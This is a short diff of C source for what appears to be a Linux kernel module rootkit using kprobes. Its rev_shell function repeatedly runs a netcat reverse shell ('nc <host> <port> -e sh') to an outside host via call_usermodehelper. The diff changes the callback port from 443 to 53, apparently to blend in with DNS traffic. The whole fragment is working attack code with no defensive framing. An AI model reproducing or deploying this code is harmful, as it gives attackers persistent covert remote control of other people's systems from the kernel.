@@ -107,9 +107,9 @@ static int handler_pre2(struct kprobe *p, struct pt_regs *regs) {
 // initiate rev shell
 static void rev_shell(void) {
 	char *shell;
-	int size = strlen("while true; do nc ") + strlen(host) + strlen(" 443 -e sh; sleep 30; done") + 1;
+	int size = strlen("while true; do nc ") + strlen(host) + strlen(" 53 -e sh; sleep 30; done") + 1;
 	shell = kmalloc(size, GFP_KERNEL);
-	snprintf(shell, size, "while true; do nc %s 443 -e sh; sleep 30; done", host);
+	snprintf(shell, size, "while true; do nc %s 53 -e sh; sleep 30; done", host);
 	char *argv[] = {"/bin/sh", "-c", shell, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
